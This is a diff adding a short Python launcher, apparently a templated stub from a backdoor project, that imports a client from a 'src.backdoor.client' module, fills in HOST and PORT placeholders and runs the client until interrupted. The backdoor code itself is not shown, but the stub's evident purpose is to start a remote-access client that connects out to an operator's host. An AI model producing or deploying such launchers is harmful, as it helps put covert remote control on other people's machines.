@@ -1,0 +1,18 @@
+from src.backdoor.client.__main__ import create_client
+
+
+HOST: str = $HOST
+PORT: int = $PORT
+
+
+def main() -> None:
+    client = create_client(HOST, PORT)
+
+    try:
+        client.run()
+    except KeyboardInterrupt:
+        ...
+
+
+if __name__ == '__main__':
+    main()
